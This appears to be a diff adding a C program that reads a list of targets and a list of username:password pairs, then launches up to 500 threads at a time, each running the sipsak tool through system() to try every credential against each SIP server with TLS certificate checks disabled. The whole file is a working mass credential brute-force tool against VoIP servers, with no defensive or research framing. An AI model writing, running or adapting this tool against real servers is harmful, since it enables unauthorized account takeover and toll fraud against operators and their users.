@@ -1,0 +1,97 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <pthread.h>
+
+#define MAX_LINE 512
+#define MAX_THREADS 500  // Number of targets to be processed simultaneously
+#define COMMAND_SIZE 2048  // Increase the size of the command buffer
+
+typedef struct {
+    char target[MAX_LINE];
+} ThreadData;
+
+char **load_credentials(int *count) {
+    FILE *credentials = fopen("credentials.txt", "r");
+    char **cred_array = NULL;
+    char line[MAX_LINE];
+    *count = 0;
+
+    while (fgets(line, sizeof(line), credentials)) {
+        strtok(line, "\n");  // Remove newline
+        cred_array = realloc(cred_array, (*count + 1) * sizeof(char *));
+        cred_array[*count] = strdup(line);
+        (*count)++;
+    }
+
+    fclose(credentials);
+    return cred_array;
+}
+
+void free_credentials(char **cred_array, int count) {
+    for (int i = 0; i < count; i++) {
+        free(cred_array[i]);
+    }
+    free(cred_array);
+}
+
+void *try_login(void *arg) {
+    ThreadData *data = (ThreadData *)arg;
+    char command[COMMAND_SIZE];
+
+    int cred_count = 0;
+    char **credentials = load_credentials(&cred_count);
+
+    for (int i = 0; i < cred_count; i++) {
+        char *username = strtok(credentials[i], ":");
+        char *password = strtok(NULL, ":");
+
+        snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E tls --tls-ignore-cert-failure",
+                 username, username, data->target, username, password, data->target, username, data->target);
+
+        printf("Executing command: %s\n", command);  // Print the command before executing
+        system(command);
+    }
+
+    free_credentials(credentials, cred_count);
+    free(data);
+    return NULL;
+}
+
+int main() {
+    FILE *targets = fopen("targets.txt", "r");
+    char target_line[MAX_LINE];
+
+    if (!targets) {
+        perror("Failed to open targets file");
+        return 1;
+    }
+
+    pthread_t threads[MAX_THREADS];
+    int current_thread = 0;
+
+    while (fgets(target_line, sizeof(target_line), targets)) {
+        strtok(target_line, "\n");  // Remove newline
+
+        ThreadData *data = malloc(sizeof(ThreadData));
+        strncpy(data->target, target_line, sizeof(data->target) - 1);
+
+        pthread_create(&threads[current_thread], NULL, try_login, data);
+        current_thread++;
+
+        if (current_thread >= MAX_THREADS) {
+            for (int i = 0; i < MAX_THREADS; i++) {
+                pthread_join(threads[i], NULL);
+            }
+            current_thread = 0;
+        }
+    }
+
+    // Join any remaining threads
+    for (int i = 0; i < current_thread; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    fclose(targets);
+    return 0;
+}
